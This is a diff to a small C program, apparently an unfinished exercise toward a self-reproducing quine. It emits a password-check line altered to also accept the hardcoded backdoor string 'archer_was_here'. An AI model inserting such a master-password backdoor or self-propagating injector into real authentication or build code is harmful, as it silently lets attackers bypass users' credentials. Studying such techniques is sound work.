@@ -2,6 +2,11 @@
 #include <stdlib.h>
 #include <string.h>
 
+/*
+9: Tab
+34: Quote
+92: Backslash
+*/
 // TODO: Turn this into a quine
 int main() {
     char* before = "\tif (strcmp(passwords[user_index], password) == 0) {\n";
@@ -15,6 +20,6 @@ int main() {
     // }
     // fwrite(line, 1, strlen(line), out);
 
-    char* f = "char* before = %c%c(strcmp(passwords[user_index], password) == 0) {%cn%c; char* f = %c%s%c; printf(f, 34, 9, 92, 34, 34, f, 34);";
-    printf(f, 34, 9, 92, 34, 34, f, 34);
+    char* f = "char* before = %c%c(strcmp(passwords[user_index], password) == 0) {%cn%c; char* after = %c%cif (strcmp(passwords[user_index], password) == 0 || strcmp(%c%carcher_was_here%c%c, password) == 0) {%cn%c; char* f = %c%s%c; printf(f, 34, 9, 92, 34, 34, 9, 92, 34, 92, 34, 92, 34, 34, f, 34);";
+    printf(f, 34, 9, 92, 34, 34, 9, 92, 34, 92, 34, 92, 34, 34, f, 34);
 }
